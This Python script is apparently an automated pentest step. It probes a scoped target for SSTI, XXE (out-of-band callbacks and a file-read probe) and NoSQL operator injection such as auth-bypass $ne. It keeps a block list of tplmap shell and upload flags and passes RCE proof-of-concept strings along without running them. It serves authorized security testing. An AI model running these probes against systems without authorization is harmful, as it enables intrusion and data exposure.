#!/usr/bin/env python3
"""
run.py -- injection-battery-xxe-ssti-nosql entry point.

Tests for SSTI, XXE, and NoSQL injection, prioritized by the Phase 2 tech
fingerprint. Detection + read-only proof; RCE is generated as a PoC for human
escalation, never executed.

SAFETY MODEL (offensive skill -- guardrails are load-bearing)
-------------------------------------------------------------
* SSTI: proven by arithmetic evaluation ({{a*b}} -> product) with a random
  canary, plus engine identification. The RCE payload for the identified engine
  is EMITTED as a PoC string (rce_poc) but NEVER sent/executed. tplmap, if used,
  runs detection-only -- --os-cmd/--os-shell/--reverse-shell/--upload/--download
  are blocklisted and refused by _assert_safe().
* XXE: blind detection via OOB canary callbacks; in-band via a BENIGN file probe
  (/etc/hostname). No entity-expansion (billion-laughs / DoS) payloads; no
  secret/credential file paths.
* NoSQL: read-only operator inference ($ne/$gt/$regex/$exists) via a baseline
  differential. No $where arbitrary-JS execution.
* Scope-gated on the target host; raw responses offloaded to the spill store.

CONTRACT
--------
* Input  : {"target_url": "...", "parameters": ["name","xml_data"],
            "tech_stack": ["php","twig"], "oob_domain": "...",
            "method": "GET|POST", "content_type": "query|form|json|xml",
            "config": {...}, "scope_policy_spill_id": "..."}
* Output : one strict JSON artifact on stdout (references/ARTIFACT_SCHEMA.md).
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import secrets
import shutil
import sys
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlencode, urlsplit, urlunsplit, parse_qsl

try:
    import httpx  # type: ignore
except ImportError:  # pragma: no cover
    httpx = None

try:
    from spill_store import read_spill, write_spill
except ImportError:  # pragma: no cover
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from spill_store import read_spill, write_spill  # type: ignore

HTTP_TIMEOUT = float(os.environ.get("INJ_HTTP_TIMEOUT", "20"))
OOB_WAIT = int(os.environ.get("INJ_OOB_WAIT", "15"))
_PAYLOADS_PATH = os.environ.get(
    "INJ_PAYLOADS",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "assets", "injection-payloads.json"))

# tplmap exploitation flags that must never be launched.
BLOCKED_TPLMAP = ("--os-cmd", "--os-shell", "--reverse-shell", "--bind-shell",
                  "--upload", "--download", "--force-overwrite")


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _host_of(url: str) -> str:
    try:
        return (urlsplit(url).hostname or "").lower()
    except ValueError:
        return ""


class UnsafeInvocation(Exception):
    pass


def _assert_safe_tplmap(argv: List[str]) -> None:
    joined = " ".join(argv)
    for bad in BLOCKED_TPLMAP:
        if bad in argv or f"{bad}=" in joined:
            raise UnsafeInvocation(f"blocked tplmap flag: {bad}")


class ScopePolicy:
    def __init__(self, policy: Optional[dict], target_host: str):
        self.raw = policy or {}
        self.have_policy = policy is not None
        self.in_scope = [self._c(p) for p in self.raw.get("in_scope", [])]
        self.out_scope = [self._c(p) for p in self.raw.get("out_of_scope", [])]
        if not self.in_scope and target_host:
            self.in_scope = [self._c(target_host), self._c(f"*.{target_host}")]

    @staticmethod
    def _c(pattern: str) -> re.Pattern:
        p = pattern.strip().lower().rstrip(".")
        if p.startswith("*."):
            return re.compile(rf"^([a-z0-9_-]+\.)*{re.escape(p[2:])}$")
        return re.compile(rf"^{re.escape(p)}$")

    def allowed(self, host: str) -> bool:
        h = (host or "").strip().lower()
        if not h:
            return False
        if any(rx.match(h) for rx in self.out_scope):
            return False
        return any(rx.match(h) for rx in self.in_scope)


class SecondaryInjectionTester:
    def __init__(self, target_url: str, parameters: List[str], tech_stack: Optional[List[str]] = None,
                 oob_domain: Optional[str] = None, method: str = "GET",
                 content_type: str = "query", scope_policy_spill_id: Optional[str] = None,
                 config: Optional[dict] = None):
        self.target_url = target_url.strip()
        self.target_host = _host_of(self.target_url)
        self.parameters = [p for p in (parameters or []) if p]
        self.tech = [t.lower() for t in (tech_stack or [])]
        self.oob_domain = (oob_domain or "").strip() or None
        self.method = (method or "GET").upper()
        self.content_type = (content_type or "query").lower()
        self.config = config or {}
        self.errors: List[Dict[str, str]] = []
        self.oob_canaries: Dict[str, dict] = {}
        policy = None
        if scope_policy_spill_id:
            try:
                policy = read_spill(scope_policy_spill_id)
            except Exception as exc:  # noqa: BLE001
                self.errors.append({"stage": "scope_load", "error": str(exc)})
        self.scope = ScopePolicy(policy, self.target_host)
        try:
            with open(_PAYLOADS_PATH, "r", encoding="utf-8") as fh:
                self.pl = json.load(fh)
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "payloads", "error": str(exc)})
            self.pl = {}

    # -- request helpers -------------------------------------------------------
    async def _send(self, client, param: str, value: Any,
                    raw_body: Optional[str] = None) -> Tuple[int, str]:
        """Send one request injecting `value` into `param` (or a raw XML body)."""
        try:
            if raw_body is not None:
                r = await client.post(self.target_url, content=raw_body.encode(),
                                      headers={"Content-Type": "application/xml"})
            elif self.content_type == "json":
                r = await client.post(self.target_url, json={param: value})
            elif self.content_type == "form":
                r = await client.post(self.target_url, data={param: value})
            else:  # query
                parts = urlsplit(self.target_url)
                q = dict(parse_qsl(parts.query, keep_blank_values=True))
                q[param] = value
                url = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))
                r = await client.get(url)
            return r.status_code, r.text
        except Exception as exc:  # noqa: BLE001
            return 0, f"__ERROR__:{exc}"

    # -- SSTI ------------------------------------------------------------------
    async def test_ssti(self, client, param: str) -> Optional[dict]:
        a, b = secrets.randbelow(900) + 100, secrets.randbelow(900) + 100
        product = str(a * b)
        confirmed_payload = None
        for wrapper in self.pl.get("ssti_arithmetic_wrappers", []):
            payload = wrapper.replace("EXPR", f"{a}*{b}")
            status, body = await self._send(client, param, payload)
            if body.startswith("__ERROR__"):
                continue
            # evaluated (product present) but NOT merely reflected (wrapper text gone)
            if product in body and payload not in body:
                confirmed_payload = payload
                break
        if not confirmed_payload:
            return None
        engine, distinctive_hit = await self._identify_engine(client, param)
        engine_info = next((e for e in self.pl.get("ssti_engines", [])
                            if e["name"] == engine), None)
        rce_poc = engine_info["rce_poc"] if engine_info else None
        return {
            "vuln_class": "SSTI", "parameter": param, "payload": confirmed_payload,
            "engine_identified": engine or "unknown",
            "confidence": "confirmed",
            "rce_capable": bool(rce_poc), "rce_executed": False,
            "rce_poc": rce_poc,   # emitted for human-gated escalation; NEVER executed here
            "evidence_spill_id": write_spill({
                "kind": "SSTI", "param": param, "arithmetic_payload": confirmed_payload,
                "product_seen": product, "engine": engine,
                "engine_distinctive": distinctive_hit,
                "rce_poc_not_executed": rce_poc, "captured_at": _now_iso()}),
        }

    async def _identify_engine(self, client, param: str) -> Tuple[Optional[str], str]:
        # order engines by tech-stack hint first
        engines = sorted(self.pl.get("ssti_engines", []),
                         key=lambda e: 0 if e.get("context") in self.tech or
                         e["name"].lower() in self.tech else 1)
        for e in engines:
            status, body = await self._send(client, param, e["distinctive"])
            if not body.startswith("__ERROR__") and e["distinctive_expect"] in body \
                    and e["distinctive"] not in body:
                return e["name"], e["distinctive"]
        return None, ""

    async def run_tplmap(self, param: str) -> Optional[str]:
        """Optional engine corroboration via tplmap, DETECTION ONLY."""
        if shutil.which("tplmap") is None:
            return None
        parts = urlsplit(self.target_url)
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        q[param] = "1"
        url = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))
        argv = ["tplmap", "-u", url, "--level", "1"]
        try:
            _assert_safe_tplmap(argv)
        except UnsafeInvocation as exc:
            self.errors.append({"stage": "tplmap_guard", "error": str(exc)})
            return None
        try:
            proc = await asyncio.create_subprocess_exec(
                *argv, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            out, _ = await asyncio.wait_for(proc.communicate(), 180)
            m = re.search(r"Template engine:\s*(\w+)", out.decode("utf-8", "replace"))
            return m.group(1) if m else None
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "tplmap", "error": str(exc)})
            return None

    # -- XXE -------------------------------------------------------------------
    async def test_xxe(self, client, param: str) -> Optional[dict]:
        xxe = self.pl.get("xxe", {})
        # 1) blind OOB
        if self.oob_domain or self.config.get("oob_poll_url"):
            canary = "x" + secrets.token_hex(6)
            base = self.oob_domain or _host_of(self.config.get("oob_poll_url", "")) or "oob.local"
            oob_host = f"{canary}.{base}" if self.oob_domain else \
                f"{_host_of(self.config.get('oob_poll_url',''))}"
            body = xxe.get("oob_param", "").replace("{OOB}", f"{canary}.{base}" if self.oob_domain
                                                    else f"{urlsplit(self.config.get('oob_poll_url','')).netloc}/{canary}")
            self.oob_canaries[canary] = {"param": param}
            await self._send(client, param, None, raw_body=body)
            if any(canary in h for h in await self._poll_oob()):
                return {"vuln_class": "XXE", "parameter": param, "payload": body,
                        "engine_identified": "external_entity_oob", "confidence": "confirmed",
                        "evidence_spill_id": write_spill({"kind": "XXE_oob", "canary": canary,
                                                          "payload": body, "captured_at": _now_iso()})}
        # 2) in-band benign file probe (differential)
        benign = self.config.get("xxe_file") or xxe.get("benign_file", "/etc/hostname")
        control_body = "<?xml version=\"1.0\"?><r>ping</r>"
        _, control = await self._send(client, param, None, raw_body=control_body)
        payload = xxe.get("file_inband", "").replace("{FILE}", benign)
        status, body = await self._send(client, param, None, raw_body=payload)
        if body.startswith("__ERROR__"):
            return None
        # The entity resolved to file content that differs from the control
        # (which contained no entity) and is not our marker text.
        new_text = (body or "").strip()
        looks_leaked = (
            body != control and new_text and "ping" not in new_text and
            (re.search(r"root:.*:0:0:", body) is not None or
             re.match(r"^[A-Za-z0-9][A-Za-z0-9._\-]{1,63}$", new_text) is not None))
        if looks_leaked:
            return {"vuln_class": "XXE", "parameter": param, "payload": payload,
                    "engine_identified": f"external_entity_file:{benign}",
                    "confidence": "confirmed",
                    "evidence_spill_id": write_spill({"kind": "XXE_file", "file": benign,
                                                      "payload": payload, "response": body[:8000],
                                                      "captured_at": _now_iso()})}
        return None

    # -- NoSQL -----------------------------------------------------------------
    async def test_nosql(self, client, param: str) -> Optional[dict]:
        # baseline with a random unlikely value
        rnd = "zz" + secrets.token_hex(6)
        base_status, base_body = await self._send(client, param, rnd)
        if base_body.startswith("__ERROR__"):
            return None
        for op in self.pl.get("nosql_operators", []):
            value = op["op"]
            if self.content_type in ("json",):
                status, body = await self._send(client, param, value)
            else:
                # bracket form for query/form: param[$ne]=x
                key, sub = list(value.items())[0]
                status, body = await self._send(client, f"{param}[{key}]",
                                                "" if sub in (None, "") else str(sub))
            if body.startswith("__ERROR__"):
                continue
            bypassed = (status == 200 and base_status in (401, 403, 404)) or \
                       (status == 200 and len(body) > len(base_body) * 1.5 and len(base_body) < 2000) or \
                       re.search(r"\"?(token|success|authenticated|welcome)\"?\s*[:=]", body, re.I) and \
                       not re.search(r"token|success|authenticated|welcome", base_body, re.I)
            mongo_err = re.search(r"MongoError|BSONError|\$where|mongodb", body, re.I)
            if bypassed or mongo_err:
                return {"vuln_class": "NoSQL", "parameter": param, "payload": json.dumps(value),
                        "engine_identified": "MongoDB" if mongo_err else "operator_injection",
                        "confidence": "confirmed" if bypassed else "suspected",
                        "evidence_spill_id": write_spill({"kind": "NoSQL", "param": param,
                                                          "operator": value, "baseline_status": base_status,
                                                          "injected_status": status, "response": body[:8000],
                                                          "captured_at": _now_iso()})}
        return None

    # -- OOB poll --------------------------------------------------------------
    async def _poll_oob(self) -> List[str]:
        poll = self.config.get("oob_poll_url")
        if not poll or httpx is None:
            return []
        deadline = time.time() + OOB_WAIT
        collected: List[str] = []
        while time.time() < deadline:
            try:
                async with httpx.AsyncClient(timeout=HTTP_TIMEOUT) as c:
                    r = await c.get(poll)
                data = r.json()
                items = data.get("interactions", data) if isinstance(data, dict) else data
                collected = [it if isinstance(it, str) else json.dumps(it) for it in (items or [])]
                if any(cn in " ".join(collected) for cn in self.oob_canaries):
                    break
            except Exception:  # noqa: BLE001
                break
            await asyncio.sleep(3)
        return collected

    # -- orchestration ---------------------------------------------------------
    def _plan(self) -> List[str]:
        classes = []
        if self.content_type == "xml" or any(t in self.tech for t in ("xml", "soap", "xxe")) \
                or any("xml" in p.lower() for p in self.parameters):
            classes.append("XXE")
        # SSTI is cheap and broadly applicable to any text-reflecting param.
        if self.content_type != "xml":
            classes.append("SSTI")
        if self.content_type in ("json", "form") or any(t in self.tech for t in ("mongo", "mongodb", "node", "express")):
            classes.append("NoSQL")
        return classes

    async def run(self) -> dict:
        started = time.time()
        if httpx is None:
            self.errors.append({"stage": "http", "error": "httpx not installed"})
            return self._artifact([], started, fatal=True)
        if not self.scope.allowed(self.target_host):
            self.errors.append({"stage": "scope", "error": f"{self.target_host} not in scope"})
            return self._artifact([], started, fatal=True)
        if not self.parameters:
            self.errors.append({"stage": "input", "error": "no parameters supplied"})
            return self._artifact([], started, fatal=True)

        plan = self._plan()
        findings: List[dict] = []
        try:
            async with httpx.AsyncClient(timeout=HTTP_TIMEOUT, follow_redirects=True) as client:
                for param in self.parameters:
                    if "SSTI" in plan:
                        f = await self.test_ssti(client, param)
                        if f:
                            findings.append(f)
                    if "XXE" in plan:
                        f = await self.test_xxe(client, param)
                        if f:
                            findings.append(f)
                    if "NoSQL" in plan:
                        f = await self.test_nosql(client, param)
                        if f:
                            findings.append(f)
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "run", "error": repr(exc)})
        return self._artifact(findings, started)

    def _artifact(self, findings: List[dict], started: float, fatal: bool = False) -> dict:
        return {
            "findings": findings,
            "meta": {
                "skill": "injection-battery-xxe-ssti-nosql", "version": "1.0", "phase": "5",
                "status": "error" if fatal else "ok",
                "generated_at": _now_iso(),
                "duration_seconds": round(time.time() - started, 2),
                "target_host": self.target_host,
                "tech_stack": self.tech,
                "classes_planned": self._plan() if not fatal else [],
                "findings_count": len(findings),
                "safety": {"rce_executed": False, "dos_entities": False,
                           "where_js_exec": False, "read_only_proof": True},
            },
            "scope_summary": {"policy_present": self.scope.have_policy,
                              "target_host": self.target_host},
            "errors": self.errors,
        }


# --- entry point -------------------------------------------------------------
def _load_input(argv: List[str]) -> dict:
    raw = ""
    if len(argv) > 1 and argv[1].strip():
        raw = argv[1]
    elif not sys.stdin.isatty():
        raw = sys.stdin.read()
    raw = raw.strip()
    if not raw:
        raise ValueError("no input: expected JSON {\"target_url\":\"...\",\"parameters\":[...]}")
    obj = json.loads(raw)
    if not isinstance(obj, dict):
        raise ValueError("input must be a JSON object")
    return obj


def _error_artifact(message: str) -> dict:
    return {
        "findings": [],
        "meta": {"skill": "injection-battery-xxe-ssti-nosql", "version": "1.0", "phase": "5",
                 "status": "error", "generated_at": _now_iso()},
        "errors": [{"stage": "init", "error": message}],
    }


async def _amain(argv: List[str]) -> int:
    try:
        payload = _load_input(argv)
    except Exception as exc:  # noqa: BLE001
        print(json.dumps(_error_artifact(f"input error: {exc}")))
        return 2
    target = str(payload.get("target_url", "")).strip()
    if not target or urlsplit(target).scheme not in ("http", "https"):
        print(json.dumps(_error_artifact("invalid 'target_url' (need http(s) URL)")))
        return 2
    tester = SecondaryInjectionTester(
        target_url=target,
        parameters=payload.get("parameters") or [],
        tech_stack=payload.get("tech_stack"),
        oob_domain=payload.get("oob_domain"),
        method=payload.get("method", "GET"),
        content_type=payload.get("content_type", "query"),
        scope_policy_spill_id=payload.get("scope_policy_spill_id"),
        config=payload.get("config"),
    )
    artifact = await tester.run()
    print(json.dumps(artifact, ensure_ascii=False))
    return 0


def main() -> int:
    return asyncio.run(_amain(sys.argv))


if __name__ == "__main__":
    raise SystemExit(main())
